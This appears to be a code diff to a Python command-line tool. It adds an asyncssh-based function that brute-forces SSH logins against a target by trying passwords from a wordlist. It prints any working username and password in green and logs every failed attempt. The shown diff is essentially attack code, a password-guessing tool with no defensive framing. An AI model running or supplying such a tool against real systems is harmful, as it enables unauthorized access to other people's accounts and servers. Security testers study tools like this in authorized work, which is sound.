@@ -3,6 +3,7 @@
 
 import argparse
 import asyncio
+import asyncssh
 from os import path
 from sys import exit
 from datetime import datetime
@@ -20,6 +21,17 @@ def get_args():
     args = parser.parse_args()
 
     return args
+
+
+async def ssh_bruteforce(target, port, username, password, found_flag):
+    try:
+        async with asyncssh.connect(host=target, username=username, password=password) as conn:
+            found_flag.set()
+
+            print(colored(f"[{port}] [SSH] Target:{target} Username:{username} Password:{password}", 'green'))
+
+    except Exception as err:
+        print(f"[Attempt] Target:{target} Username:{username} Password:{password}")
 
 
 async def main(target, port, username, wordlist):
@@ -55,7 +67,7 @@ if __name__ == '__main__':
     args = get_args()
 
     if not path.exists(args.wordlist):
-        print(colored(f"[-] {args.wordlist} : No such file or directory", "red"))
+        print(colored(f"[-] {args.wordlist} : No such file or directory", 'red'))
         exit(1)
 
     print('\n'+'-'*100+'\n'+'-'*100+'\n')
